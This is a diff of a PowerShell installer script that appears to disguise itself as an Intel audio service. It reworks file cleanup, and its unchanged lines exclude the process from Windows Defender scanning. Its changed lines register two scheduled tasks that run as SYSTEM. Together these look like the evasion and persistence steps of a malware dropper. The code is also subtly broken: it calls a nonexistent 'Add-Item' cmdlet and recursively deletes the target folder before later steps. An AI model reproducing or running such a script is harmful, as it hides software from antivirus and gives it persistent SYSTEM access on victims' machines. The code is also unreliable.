@@ -12,22 +12,38 @@ $TargetFile = "$TargetPath\Intel Dynamic Audio Platform Service.exe"
 $TargetZip = "$TargetPath\Intel Dynamic Audio Platform Service.zip"
 $TargetLog = "$TargetPath\Intel Dynamic Audio Platform Service.log"
 $TargetXml = "$TargetPath\Intel Dynamic Audio Platform Service.xml"
-$TargetXml = "$TargetPath\Intel Dynamic Audio Notification Service.xml"
+$TargetEmail = "$TargetPath\Intel Dynamic Audio Notification Service.xml"
 $TargetScript = "$TargetPath\Intel Dynamic Audio Notification Service.ps1"
 
 if (Test-Path "$TargetFile") {
   Remove-Item -Force -Path "$TargetFile"
-  Remove-Item -Force -Path "$TargetScript"
-  Remove-Item -Force -Path "$TargetXml"
-  Remove-Item -Force -Path "$TargetEmail"
-  Remove-Item -Force -Path "Target"
+  Write-Output "Target file removed"
+}
 
-  Write-Output "Project file removed"
+if (Test-Path "$TargetScript") {
+  Remove-Item -Force -Path "$TargetScript"
+  Write-Output "Target file removed"
+}
+
+if (Test-Path "$TargetXml") {
+  Remove-Item -Force -Path "$TargetXml"
+  Write-Output "Target file removed"
+}
+
+if (Test-Path "$TargetEmail") {
+  Remove-Item -Force -Path "$TargetEmail"
+  Write-Output "Target file removed"
 }
 
 if (Test-Path "$TargetZip") {
   Remove-Item -Force -Path "$TargetZip"
   Write-Output "Project zip removed"
+}
+
+if (Test-Path "$TargetPath") {
+  Remove-Item -Recurse -Force -Path "$TargetPath"
+  Add-Item -Path "$TargetPath" -ItemType Directory
+  Write-Output "Target path created"
 }
 
 Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service' -Force
@@ -48,5 +64,5 @@ if (-Not (Test-Path "$TargetFile")) {
   Write-Output "Zip file removed"
 }
 
-schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
-schtasks.exe /Create /XML $TargetEmail /tn 'Intel Dynamic Audio Notification Service' /ru SYSTEM /f
+schtasks.exe /Create /XML "$TargetXml" /tn 'Intel Dynamic Audio Platform Service' /ru SYSTEM /f
+schtasks.exe /Create /XML "$TargetEmail" /tn 'Intel Dynamic Audio Notification Service' /ru SYSTEM /f
